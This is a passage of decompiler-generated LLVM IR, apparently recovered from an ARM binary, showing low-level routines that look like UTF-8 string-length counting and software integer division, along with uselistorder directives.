42, 291, 292, 250, 251, 252, 253, 20, 254, 255, 52, 53, 54, 55, 21, 56, 256, 257, 258, 259, 260, 261, 262, 263, 264, 67 }
  uselistorder label %dec_label_pc_14850, { 1, 2, 0, 3 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %dec_label_pc_1483c.bb36_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_147b4.lr.ph, { 1, 0 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %bb32, { 1, 0 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @function_14858() local_unnamed_addr {
dec_label_pc_14858:
  %v0_1485c = load i32, i32* @r0, align 4
  store i32 %v0_1485c, i32* @lr, align 4
  %v2_1485c = icmp eq i32 %v0_1485c, 0
  br i1 %v2_1485c, label %bb, label %dec_label_pc_14874

bb:                                               ; preds = %dec_label_pc_14858
  ret i32 -1

dec_label_pc_1486c:                               ; preds = %dec_label_pc_1487c
  %v1_1486c = add i32 %v1_14884, 2
  br label %dec_label_pc_1489c

dec_label_pc_14874:                               ; preds = %dec_label_pc_14858
  %v0_14874 = load i32, i32* @r1, align 4
  br label %dec_label_pc_14884

dec_label_pc_1487c:                               ; preds = %dec_label_pc_14884
  %v1_14890 = and i32 %v6_14884, 192
  %v2_14894 = add i32 %v6_14884, %v1_14888
  %v2_1487c = icmp eq i32 %v1_14890, 192
  br i1 %v2_1487c, label %dec_label_pc_1486c, label %dec_label_pc_14884

dec_label_pc_14884:                               ; preds = %dec_label_pc_1487c, %dec_label_pc_14874
  %v1_14884 = phi i32 [ %v2_14894, %dec_label_pc_1487c ], [ %v0_14874, %dec_label_pc_14874 ]
  %v2_14884 = add i32 %v1_14884, %v0_1485c
  %v3_14884 = inttoptr i32 %v2_14884 to i8*
  %v4_14884 = load i8, i8* %v3_14884, align 1
  %v6_14884 = zext i8 %v4_14884 to i32
  %v1_14888 = add i32 %v1_14884, 1
  %v2_1488c = icmp eq i8 %v4_14884, 0
  br i1 %v2_1488c, label %dec_label_pc_1489c, label %dec_label_pc_1487c

dec_label_pc_1489c:                               ; preds = %dec_label_pc_14884, %dec_label_pc_1486c
  %v1_1489c = phi i32 [ %v1_1486c, %dec_label_pc_1486c ], [ %v1_14888, %dec_label_pc_14884 ]
  %v2_1489c = sub i32 %v1_1489c, %v0_14874
  ret i32 %v2_1489c

; uselistorder directives
  uselistorder i32 %v6_14884, { 1, 0 }
  uselistorder i32 %v1_14884, { 2, 1, 0 }
  uselistorder i32 %v0_1485c, { 0, 2, 1 }
  uselistorder i8 0, { 60, 17, 24, 25, 61, 16, 21, 62, 26, 27, 28, 29, 30, 49, 66, 64, 48, 65, 63, 47, 41, 7, 8, 67, 68, 72, 73, 23, 57, 58, 69, 70, 71, 14, 74, 42, 50, 76, 75, 51, 43, 77, 78, 79, 80, 81, 82, 31, 9, 54, 86, 0, 84, 83, 52, 1, 85, 53, 2, 87, 88, 32, 3, 90, 89, 55, 91, 92, 93, 94, 44, 45, 96, 97, 95, 10, 11, 12, 98, 4, 15, 99, 100, 101, 18, 59, 103, 104, 105, 106, 102, 46, 107, 108, 109, 110, 33, 34, 35, 36, 37, 111, 19, 13, 22, 5, 6, 113, 112, 38, 114, 115, 39, 116, 56, 20, 117, 118, 119, 120, 123, 121, 122, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 143, 142, 40, 144, 145, 146 }
  uselistorder i32 192, { 0, 4, 1, 5, 2, 6, 3, 7 }
}

define i32 @function_148a4() local_unnamed_addr {
dec_label_pc_148a4:
  %v0_148a4 = load i32, i32* @r1, align 4
  %v1_148a4 = add i32 %v0_148a4, -1
  %v7_148a4 = icmp eq i32 %v0_148a4, 1
  br i1 %v7_148a4, label %bb, label %bb82

bb:                                               ; preds = %dec_label_pc_148a4
  %v2_148a8 = load i32, i32* @r0, align 4
  ret i32 %v2_148a8

bb82:                                             ; preds = %dec_label_pc_148a4
  %v2_148a4 = icmp eq i32 %v0_148a4, 0
  br i1 %v2_148a4, label %dec_label_pc_1498c, label %dec_label_pc_148b0

dec_label_pc_148b0:                               ; preds = %bb82
  %v0_148b0 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_148b0, %v0_148a4
  br i1 %tmp, label %dec_label_pc_148b8, label %dec_label_pc_14944

dec_label_pc_148b8:                               ; preds = %dec_label_pc_148b0
  %v2_148b8 = and i32 %v1_148a4, %v0_148a4
  %v4_148b8 = icmp eq i32 %v2_148b8, 0
  br i1 %v4_148b8, label %dec_label_pc_14950, label %dec_label_pc_148c0

dec_label_pc_148c0:                               ; preds = %dec_label_pc_148b8
  %v3_148c0 = icmp ult i32 %v0_148a4, 536870912
  br i1 %v3_148c0, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_148c0
  %v4_148c4 = mul i32 %v0_148a4, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_148c0, %.thread
  %v0_148e4.pr36.ph = phi i32 [ %v4_148c4, %.thread ], [ %v0_148a4, %dec_label_pc_148c0 ]
  %storemerge137 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_148c0 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb85
  %v0_148e4.pr36 = phi i32 [ %v4_148d8, %bb85 ], [ %v0_148e4.pr36.ph, %.preheader.preheader ]
  %v1_148dc = phi i32 [ %v4_148dc, %bb85 ], [ %storemerge137, %.preheader.preheader ]
  %v2_148d0 = icmp ugt i32 %v0_148e4.pr36, 268435455
  br i1 %v2_148d0, label %.thread2, label %bb83

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_148e4thread-pre-split.loopexit

bb83:                                             ; preds = %.preheader
  %v4_148d4 = icmp ult i32 %v0_148e4.pr36, %v0_148b0
  br i1 %v4_148d4, label %bb84, label %dec_label_pc_148e4thread-pre-split.loopexit.loopexit

bb84:                                             ; preds = %bb83
  %v2_148d8 = and i32 %v0_148e4.pr36, 268435456
  %v3_148d8 = icmp eq i32 %v2_148d8, 0
  %v4_148d8 = mul i32 %v0_148e4.pr36, 16
  br i1 %v3_148d8, label %bb85, label %dec_label_pc_148e4.loopexit

bb85:                                             ; preds = %bb84
  %v2_148dc = and i32 %v1_148dc, 268435456
  %v3_148dc = icmp eq i32 %v2_148dc, 0
  %v4_148dc = mul i32 %v1_148dc, 16
  br i1 %v3_148dc, label %.preheader, label %dec_label_pc_148e4thread-pre-split.loopexit.loopexit

dec_label_pc_148e4thread-pre-split.loopexit.loopexit: ; preds = %bb85, %bb83
  %v1_148f048.ph = phi i32 [ %v1_148dc, %bb83 ], [ %v4_148dc, %bb85 ]
  %v0_148e4.pr38.ph = phi i32 [ %v0_148e4.pr36, %bb83 ], [ %v4_148d8, %bb85 ]
  br label %dec_label_pc_148e4thread-pre-split.loopexit

dec_label_pc_148e4thread-pre-split.loopexit:      ; preds = %dec_label_pc_148e4thread-pre-split.loopexit.loopexit, %.thread2
  %v1_148f048 = phi i32 [ %v1_148dc, %.thread2 ], [ %v1_148f048.ph, %dec_label_pc_148e4thread-pre-split.loopexit.loopexit ]
  %v0_148e4.pr38 = phi i32 [ %v0_148e4.pr36, %.thread2 ], [ %v0_148e4.pr38.ph, %dec_label_pc_148e4thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_148e4thread-pre-split

dec_label_pc_148e4thread-pre-split:               ; preds = %dec_label_pc_148e4thread-pre-split.loopexit, %bb87
  %v1_148f046 = phi i32 [ %v1_148f048, %dec_label_pc_148e4thread-pre-split.loopexit ], [ %v3_148f0, %bb87 ]
  %v0_148e4.pr = phi i32 [ %v0_148e4.pr38, %dec_label_pc_148e4thread-pre-split.loopexit ], [ %v3_148ec, %bb87 ]
  br label %dec_label_pc_148e4

dec_label_pc_148e4.loopexit:                      ; preds = %bb84
  br label %dec_label_pc_148e4

dec_label_pc_148e4:                               ; preds = %dec_label_pc_148e4.loopexit, %dec_label_pc_148e4thread-pre-split
  %v1_148f0 = phi i32 [ %v1_148f046, %dec_label_pc_148e4thread-pre-split ], [ %v1_148dc, %dec_label_pc_148e4.loopexit ]
  %v1_148ec = phi i32 [ %v0_148e4.pr, %dec_label_pc_148e4thread-pre-split ], [ %v4_148d8, %dec_label_pc_148e4.loopexit ]
  %v2_148e4 = icmp slt i32 %v1_148ec, 0
  br i1 %v2_148e4, label %dec_label_pc_148f8, label %bb86

bb86:                                             ; preds = %dec_label_pc_148e4
  %v4_148e8 = icmp ult i32 %v1_148ec, %v0_148b0
  br i1 %v4_148e8, label %bb87, label %dec_label_pc_148f8

bb87:                                             ; preds = %bb86
  %v3_148ec = mul i32 %v1_148ec, 2
  %v2_148f0 = icmp slt i32 %v1_148f0, 0
  %v3_148f0 = mul i32 %v1_148f0, 2
  br i1 %v2_148f0, label %dec_label_pc_148f8, label %dec_label_pc_148e4thread-pre-split

dec_label_pc_148f8:                               ; preds = %bb86, %dec_label_pc_148e4, %bb87
  %v2_1490459 = phi i32 [ %v3_148f0, %bb87 ], [ %v1_148f0, %bb86 ], [ %v1_148f0, %dec_label_pc_148e4 ]
  %v1_148fc51 = phi i32 [ %v3_148ec, %bb87 ], [ %v1_148ec, %bb86 ], [ %v1_148ec, %dec_label_pc_148e4 ]
  br label %dec_label_pc_148fc

dec_label_pc_148fc:                               ; preds = %.thread11, %dec_label_pc_148f8
  %v1_14930 = phi i32 [ %v4_14930, %.thread11 ], [ %v2_1490459, %dec_label_pc_148f8 ]
  %v1_14904 = phi i32 [ %v0_1493c, %.thread11 ], [ 0, %dec_label_pc_148f8 ]
  %v1_14934 = phi i32 [ %v4_14934, %.thread11 ], [ %v1_148fc51, %dec_label_pc_148f8 ]
  %v1_14900 = phi i32 [ %v0_1492c, %.thread11 ], [ %v0_148b0, %dec_label_pc_148f8 ]
  %v3_148fc = icmp ult i32 %v1_14900, %v1_14934
  br i1 %v3_148fc, label %.thread7, label %bb88

bb88:                                             ; preds = %dec_label_pc_148fc
  %v3_14900 = sub i32 %v1_14900, %v1_14934
  %v3_14904 = or i32 %v1_14904, %v1_14930
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_148fc, %bb88
  %v1_1490c = phi i32 [ %v1_14900, %dec_label_pc_148fc ], [ %v3_14900, %bb88 ]
  %v1_14910 = phi i32 [ %v1_14904, %dec_label_pc_148fc ], [ %v3_14904, %bb88 ]
  %v4_14908 = udiv i32 %v1_14934, 2
  %v6_14908 = icmp ult i32 %v1_1490c, %v4_14908
  br i1 %v6_14908, label %.thread8, label %bb89

bb89:                                             ; preds = %.thread7
  %v3_1490c = urem i32 %v1_14934, 2
  %v4_1490c = icmp eq i32 %v3_1490c, 0
  %v6_1490c = sub i32 %v1_1490c, %v4_14908
  br i1 %v4_1490c, label %.thread8, label %bb90

bb90:                                             ; preds = %bb89
  %v5_14910 = udiv i32 %v1_14930, 2
  %v6_14910 = or i32 %v1_14910, %v5_14910
  br label %.thread8

.thread8:                                         ; preds = %bb89, %.thread7, %bb90
  %v1_14918 = phi i32 [ %v6_1490c, %bb89 ], [ %v1_1490c, %.thread7 ], [ %v6_1490c, %bb90 ]
  %v1_1491c = phi i32 [ %v1_14910, %bb89 ], [ %v1_14910, %.thread7 ], [ %v6_14910, %bb90 ]
  %v4_14914 = udiv i32 %v1_14934, 4
  %v6_14914 = icmp ult i32 %v1_14918, %v4_14914
  br i1 %v6_14914, label %.thread9, label %bb91

bb91:                                             ; preds = %.thread8
  %v3_14918 = and i32 %v1_14934, 2
  %v4_14918 = icmp eq i32 %v3_14918, 0
  %v6_14918 = sub i32 %v1_14918, %v4_14914
  br i1 %v4_14918, label %.thread9, label %bb92

bb92:                                             ; preds = %bb91
  %v5_1491c = udiv i32 %v1_14930, 4
  %v6_1491c = or i32 %v1_1491c, %v5_1491c
  br label %.thread9

.thread9:                                         ; preds = %bb91, %.thread8, %bb92
  %v1_14924 = phi i32 [ %v6_14918, %bb91 ], [ %v1_14918, %.thread8 ], [ %v6_14918, %bb92 ]
  %v1_14928 = phi i32 [ %v1_1491c, %bb91 ], [ %v1_1491c, %.thread8 ], [ %v6_1491c, %bb92 ]
  %v4_14920 = udiv i32 %v1_14934, 8
  %v6_14920 = icmp ult i32 %v1_14924, %v4_14920
  br i1 %v6_14920, label %thread-pre-split, label %bb93

bb93:                                             ; preds = %.thread9
  %v3_14924 = and i32 %v1_14934, 4
  %v4_14924 = icmp eq i32 %v3_14924, 0
  %v6_14924 = sub i32 %v1_14924, %v4_14920
  br i1 %v4_14924, label %thread-pre-split, label %bb94

bb94:                                             ; preds = %bb93
  %v5_14928 = udiv i32 %v1_14930, 8
  %v6_14928 = or i32 %v1_14928, %v5_14928
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb94, %.thread9, %bb93
  %v0_1493c = phi i32 [ %v1_14928, %bb93 ], [ %v1_14928, %.thread9 ], [ %v6_14928, %bb94 ]
  %v0_1492c = phi i32 [ %v6_14924, %bb93 ], [ %v1_14924, %.thread9 ], [ %v6_14924, %bb94 ]
  %v2_1492c = icmp eq i32 %v0_1492c, 0
  br i1 %v2_1492c, label %dec_label_pc_1493c, label %bb95

bb95:                                             ; preds = %thread-pre-split
  %tmp142 = icmp ult i32 %v1_14930, 16
  br i1 %tmp142, label %dec_label_pc_1493c, label %.thread11

.thread11:                                        ; preds = %bb95
  %v4_14930 = udiv i32 %v1_14930, 16
  %v4_14934 = udiv i32 %v1_14934, 16
  br label %dec_label_pc_148fc

dec_label_pc_1493c:                               ; preds = %thread-pre-split, %bb95
  ret i32 %v0_1493c

dec_label_pc_14944:                               ; preds = %dec_label_pc_148b0
  %v9_148b0 = icmp eq i32 %v0_148b0, %v0_148a4
  %. = zext i1 %v9_148b0 to i32
  ret i32 %.

dec_label_pc_14950:                               ; preds = %dec_label_pc_148b8
  %v2_14950 = icmp ugt i32 %v0_148a4, 65535
  br i1 %v2_14950, label %bb99, label %.thread16

bb99:                                             ; preds = %dec_label_pc_14950
  %v2_14954 = and i32 %v0_148a4, 32768
  %v3_14954 = icmp eq i32 %v2_14954, 0
  %v4_14954 = udiv i32 %v0_148a4, 65536
  br i1 %v3_14954, label %.thread16, label %bb100

.thread16:                                        ; preds = %bb99, %dec_label_pc_14950
  %v0_1496065 = phi i32 [ %v0_148a4, %dec_label_pc_14950 ], [ %v4_14954, %bb99 ]
  br label %bb100

bb100:                                            ; preds = %bb99, %.thread16
  %v1_14964 = phi i32 [ %v0_1496065, %.thread16 ], [ %v4_14954, %bb99 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb99 ]
  %v2_14960 = icmp ugt i32 %v1_14964, 255
  br i1 %v2_14960, label %bb101, label %.thread17

bb101:                                            ; preds = %bb100
  %v2_14964 = and i32 %v1_14964, 128
  %v3_14964 = icmp eq i32 %v2_14964, 0
  %v4_14964 = udiv i32 %v1_14964, 256
  br i1 %v3_14964, label %.thread17, label %bb102

bb102:                                            ; preds = %bb101
  %v2_14968 = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb101, %bb100, %bb102
  %v1_14974 = phi i32 [ %storemerge, %bb100 ], [ %storemerge, %bb101 ], [ %v2_14968, %bb102 ]
  %v1_14970 = phi i32 [ %v1_14964, %bb100 ], [ %v4_14964, %bb101 ], [ %v4_14964, %bb102 ]
  %v2_1496c = icmp ugt i32 %v1_14970, 15
  br i1 %v2_1496c, label %bb103, label %.thread18

bb103:                                            ; preds = %.thread17
  %v2_14970 = and i32 %v1_14970, 8
  %v3_14970 = icmp eq i32 %v2_14970, 0
  %v4_14970 = udiv i32 %v1_14970, 16
  br i1 %v3_14970, label %.thread18, label %bb104

bb104:                                            ; preds = %bb103
  %v2_14974 = add nsw i32 %v1_14974, 4
  br label %.thread18

.thread18:                                        ; preds = %bb103, %.thread17, %bb104
  %v4_1497c = phi i32 [ %v1_14974, %.thread17 ], [ %v1_14974, %bb103 ], [ %v2_14974, %bb104 ]
  %v5_14980 = phi i32 [ %v1_14970, %.thread17 ], [ %v4_14970, %bb103 ], [ %v4_14970, %bb104 ]
  %v2_14978 = icmp ugt i32 %v5_14980, 3
  %v7_14978 = icmp eq i32 %v5_14980, 4
  %v2_1497c = xor i1 %v7_14978, true
  %v3_1497c = and i1 %v2_14978, %v2_1497c
  br i1 %v3_1497c, label %bb105, label %bb106

bb105:                                            ; preds = %.thread18
  %v5_1497c = add nsw i32 %v4_1497c, 3
  br label %bb106

bb106:                                            ; preds = %.thread18, %bb105
  %v4_14980 = phi i32 [ %v4_1497c, %.thread18 ], [ %v5_1497c, %bb105 ]
  %v2_14980 = xor i1 %v2_14978, true
  %v3_14980 = or i1 %v7_14978, %v2_14980
  br i1 %v3_14980, label %bb107, label %bb108

bb107:                                            ; preds = %bb106
  %v8_14980 = udiv i32 %v5_14980, 2
  %v9_14980 = add i32 %v4_14980, %v8_14980
  br label %bb108

bb108:                                            ; preds = %bb106, %bb107
  %v1_14984 = phi i32 [ %v4_14980, %bb106 ], [ %v9_14980, %bb107 ]
  %v6_14984 = lshr i32 %v0_148b0, %v1_14984
  ret i32 %v6_14984

dec_label_pc_1498c:                               ; preds = %bb82
  %v0_1498c = load i32, i32* @lr, align 4
  %v0_14990 = call i32 @function_ca14()
  store i32 0, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v0_1498c)
  %v9_1499c = load i32, i32* @lr, align 4
  %v0_149a0 = call i32 @function_148a4()
  store i32 %v9_1499c, i32* @lr, align 4
  ret i32 %v0_149a0

; uselistorder directives
  uselistorder i32 %v4_14980, { 1, 0 }
  uselistorder i1 %v7_14978, { 1, 0 }
  uselistorder i32 %v4_14970, { 1, 0 }
  uselistorder i32 %v1_14970, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14964, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_14964, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14954, { 1, 0 }
  uselistorder i32 %v0_1492c, { 1, 0 }
  uselistorder i32 %v4_14920, { 1, 0 }
  uselistorder i32 %v1_14928, { 1, 2, 0 }
  uselistorder i32 %v4_14914, { 1, 0 }
  uselistorder i32 %v1_1491c, { 1, 2, 0 }
  uselistorder i32 %v4_14908, { 1, 0 }
  uselistorder i32 %v1_14910, { 1, 2, 0 }
  uselistorder i32 %v1_14934, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_14904, { 1, 0 }
  uselistorder i32 %v1_14930, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_148f0, { 1, 0 }
  uselistorder i32 %v3_148ec, { 1, 0 }
  uselistorder i32 %v1_148ec, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_148f0, { 1, 2, 0, 3 }
  uselistorder i32 %v4_148dc, { 1, 0 }
  uselistorder i32 %v4_148d8, { 2, 1, 0 }
  uselistorder i32 %v1_148dc, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_148e4.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_148b0, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_148a4, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1, 10, 12, 11 }
  uselistorder i32 ()* @function_148a4, { 8, 12, 11, 10, 7, 6, 5, 4, 3, 2, 9, 1, 0 }
  uselistorder label %bb108, { 1, 0 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb100, { 1, 0 }
  uselistorder label %dec_label_pc_1493c, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_148f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_148e4thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @function_149b4() local_unnamed_addr {
dec_label_pc_149b4:
  %v0_149b4 = load i32, i32* @r1, align 4
  %v1_149b4 = icmp slt i32 %v0_149b4, 0
  %v2_149b4 = icmp eq i32 %v0_149b4, 0
  %v0_149b8 = load i32, i32* @r0, align 4
  %v2_149b8 = xor i32 %v0_149b8, %v0_149b4
  br i1 %v2_149b4, label %dec_label_pc_14acc, label %dec_label_pc_149c0

dec_label_pc_149c0:                               ; preds = %dec_label_pc_149b4
  br i1 %v1_149b4, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_149c0
  %v2_149c0 = sub i32 0, %v0_149b4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_149c0, %bb
  %v1_14a8c = phi i32 [ %v2_149c0, %bb ], [ %v0_149b4, %dec_label_pc_149c0 ]
  %v1_149c4 = add i32 %v1_14a8c, -1
  %v7_149c4 = icmp eq i32 %v1_14a8c, 1
  br i1 %v7_149c4, label %dec_label_pc_14a6c, label %dec_label_pc_149cc

dec_label_pc_149cc:                               ; preds = %thread-pre-split
  %v1_149cc = icmp slt i32 %v0_149b8, 0
  br i1 %v1_149cc, label %bb86, label %bb87

bb86:                                             ; preds = %dec_label_pc_149cc
  %v2_149d0 = sub i32 0, %v0_149b8
  br label %bb87

bb87:                                             ; preds = %dec_label_pc_149cc, %bb86
  %v0_14ac0 = phi i32 [ %v0_149b8, %dec_label_pc_149cc ], [ %v2_149d0, %bb86 ]
  %v3_149d4 = icmp uge i32 %v0_14ac0, %v1_14a8c
  %v9_149d4 = icmp eq i32 %v0_14ac0, %v1_14a8c
  %v2_149d8 = xor i1 %v3_149d4, true
  %v3_149d8 = or i1 %v9_149d4, %v2_149d8
  br i1 %v3_149d8, label %dec_label_pc_14a78, label %dec_label_pc_149dc

dec_label_pc_149dc:                               ; preds = %bb87
  %v2_149dc = and i32 %v1_149c4, %v1_14a8c
  %v4_149dc = icmp eq i32 %v2_149dc, 0
  br i1 %v4_149dc, label %dec_label_pc_14a88, label %dec_label_pc_149e4

dec_label_pc_149e4:                               ; preds = %dec_label_pc_149dc
  %v3_149e4 = icmp ult i32 %v1_14a8c, 536870912
  br i1 %v3_149e4, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_149e4
  %v4_149e8 = mul i32 %v1_14a8c, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_149e4, %.thread
  %v0_14a08.pr40.ph = phi i32 [ %v4_149e8, %.thread ], [ %v1_14a8c, %dec_label_pc_149e4 ]
  %storemerge144 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_149e4 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb90
  %v0_14a08.pr40 = phi i32 [ %v4_149fc, %bb90 ], [ %v0_14a08.pr40.ph, %.preheader.preheader ]
  %v1_14a00 = phi i32 [ %v4_14a00, %bb90 ], [ %storemerge144, %.preheader.preheader ]
  %v2_149f4 = icmp ugt i32 %v0_14a08.pr40, 268435455
  br i1 %v2_149f4, label %.thread3, label %bb88

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_14a08thread-pre-split.loopexit

bb88:                                             ; preds = %.preheader
  %v4_149f8 = icmp ult i32 %v0_14a08.pr40, %v0_14ac0
  br i1 %v4_149f8, label %bb89, label %dec_label_pc_14a08thread-pre-split.loopexit.loopexit

bb89:                                             ; preds = %bb88
  %v2_149fc = and i32 %v0_14a08.pr40, 268435456
  %v3_149fc = icmp eq i32 %v2_149fc, 0
  %v4_149fc = mul i32 %v0_14a08.pr40, 16
  br i1 %v3_149fc, label %bb90, label %dec_label_pc_14a08.loopexit

bb90:                                             ; preds = %bb89
  %v2_14a00 = and i32 %v1_14a00, 268435456
  %v3_14a00 = icmp eq i32 %v2_14a00, 0
  %v4_14a00 = mul i32 %v1_14a00, 16
  br i1 %v3_14a00, label %.preheader, label %dec_label_pc_14a08thread-pre-split.loopexit.loopexit

dec_label_pc_14a08thread-pre-split.loopexit.loopexit: ; preds = %bb90, %bb88
  %v1_14a1452.ph = phi i32 [ %v1_14a00, %bb88 ], [ %v4_14a00, %bb90 ]
  %v0_14a08.pr42.ph = phi i32 [ %v0_14a08.pr40, %bb88 ], [ %v4_149fc, %bb90 ]
  br label %dec_label_pc_14a08thread-pre-split.loopexit

dec_label_pc_14a08thread-pre-split.loopexit:      ; preds = %dec_label_pc_14a08thread-pre-split.loopexit.loopexit, %.thread3
  %v1_14a1452 = phi i32 [ %v1_14a00, %.thread3 ], [ %v1_14a1452.ph, %dec_label_pc_14a08thread-pre-split.loopexit.loopexit ]
  %v0_14a08.pr42 = phi i32 [ %v0_14a08.pr40, %.thread3 ], [ %v0_14a08.pr42.ph, %dec_label_pc_14a08thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_14a08thread-pre-split

dec_label_pc_14a08thread-pre-split:               ; preds = %dec_label_pc_14a08thread-pre-split.loopexit, %bb92
  %v1_14a1450 = phi i32 [ %v1_14a1452, %dec_label_pc_14a08thread-pre-split.loopexit ], [ %v3_14a14, %bb92 ]
  %v2_14a0c48 = phi i32 [ %v0_14ac0, %dec_label_pc_14a08thread-pre-split.loopexit ], [ %v2_14a0c, %bb92 ]
  %v0_14a08.pr = phi i32 [ %v0_14a08.pr42, %dec_label_pc_14a08thread-pre-split.loopexit ], [ %v3_14a10, %bb92 ]
  br label %dec_label_pc_14a08

dec_label_pc_14a08.loopexit:                      ; preds = %bb89
  br label %dec_label_pc_14a08

dec_label_pc_14a08:                               ; preds = %dec_label_pc_14a08.loopexit, %dec_label_pc_14a08thread-pre-split
  %v1_14a14 = phi i32 [ %v1_14a1450, %dec_label_pc_14a08thread-pre-split ], [ %v1_14a00, %dec_label_pc_14a08.loopexit ]
  %v2_14a0c = phi i32 [ %v2_14a0c48, %dec_label_pc_14a08thread-pre-split ], [ %v0_14ac0, %dec_label_pc_14a08.loopexit ]
  %v1_14a10 = phi i32 [ %v0_14a08.pr, %dec_label_pc_14a08thread-pre-split ], [ %v4_149fc, %dec_label_pc_14a08.loopexit ]
  %v2_14a08 = icmp slt i32 %v1_14a10, 0
  br i1 %v2_14a08, label %dec_label_pc_14a1c, label %bb91

bb91:                                             ; preds = %dec_label_pc_14a08
  %v4_14a0c = icmp ult i32 %v1_14a10, %v2_14a0c
  br i1 %v4_14a0c, label %bb92, label %dec_label_pc_14a1c

bb92:                                             ; preds = %bb91
  %v3_14a10 = mul i32 %v1_14a10, 2
  %v2_14a14 = icmp slt i32 %v1_14a14, 0
  %v3_14a14 = mul i32 %v1_14a14, 2
  br i1 %v2_14a14, label %dec_label_pc_14a1c, label %dec_label_pc_14a08thread-pre-split

dec_label_pc_14a1c:                               ; preds = %bb91, %dec_label_pc_14a08, %bb92
  %v2_14a2863 = phi i32 [ %v3_14a14, %bb92 ], [ %v1_14a14, %bb91 ], [ %v1_14a14, %dec_label_pc_14a08 ]
  %v1_14a2055 = phi i32 [ %v3_14a10, %bb92 ], [ %v1_14a10, %bb91 ], [ %v1_14a10, %dec_label_pc_14a08 ]
  br label %dec_label_pc_14a20

dec_label_pc_14a20:                               ; preds = %.thread13, %dec_label_pc_14a1c
  %v1_14a54 = phi i32 [ %v4_14a54, %.thread13 ], [ %v2_14a2863, %dec_label_pc_14a1c ]
  %v1_14a28 = phi i32 [ %v1_14a64, %.thread13 ], [ 0, %dec_label_pc_14a1c ]
  %v1_14a58 = phi i32 [ %v4_14a58, %.thread13 ], [ %v1_14a2055, %dec_label_pc_14a1c ]
  %v1_14a24 = phi i32 [ %v0_14a50, %.thread13 ], [ %v0_14ac0, %dec_label_pc_14a1c ]
  %v3_14a20 = icmp ult i32 %v1_14a24, %v1_14a58
  br i1 %v3_14a20, label %.thread8, label %bb93

bb93:                                             ; preds = %dec_label_pc_14a20
  %v3_14a24 = sub i32 %v1_14a24, %v1_14a58
  %v3_14a28 = or i32 %v1_14a28, %v1_14a54
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_14a20, %bb93
  %v1_14a30 = phi i32 [ %v1_14a24, %dec_label_pc_14a20 ], [ %v3_14a24, %bb93 ]
  %v1_14a34 = phi i32 [ %v1_14a28, %dec_label_pc_14a20 ], [ %v3_14a28, %bb93 ]
  %v4_14a2c = udiv i32 %v1_14a58, 2
  %v6_14a2c = icmp ult i32 %v1_14a30, %v4_14a2c
  br i1 %v6_14a2c, label %.thread9, label %bb94

bb94:                                             ; preds = %.thread8
  %v3_14a30 = urem i32 %v1_14a58, 2
  %v4_14a30 = icmp eq i32 %v3_14a30, 0
  %v6_14a30 = sub i32 %v1_14a30, %v4_14a2c
  br i1 %v4_14a30, label %.thread9, label %bb95

bb95:                                             ; preds = %bb94
  %v5_14a34 = udiv i32 %v1_14a54, 2
  %v6_14a34 = or i32 %v1_14a34, %v5_14a34
  br label %.thread9

.thread9:                                         ; preds = %bb94, %.thread8, %bb95
  %v1_14a3c = phi i32 [ %v6_14a30, %bb94 ], [ %v1_14a30, %.thread8 ], [ %v6_14a30, %bb95 ]
  %v1_14a40 = phi i32 [ %v1_14a34, %bb94 ], [ %v1_14a34, %.thread8 ], [ %v6_14a34, %bb95 ]
  %v4_14a38 = udiv i32 %v1_14a58, 4
  %v6_14a38 = icmp ult i32 %v1_14a3c, %v4_14a38
  br i1 %v6_14a38, label %.thread10, label %bb96

bb96:                                             ; preds = %.thread9
  %v3_14a3c = and i32 %v1_14a58, 2
  %v4_14a3c = icmp eq i32 %v3_14a3c, 0
  %v6_14a3c = sub i32 %v1_14a3c, %v4_14a38
  br i1 %v4_14a3c, label %.thread10, label %bb97

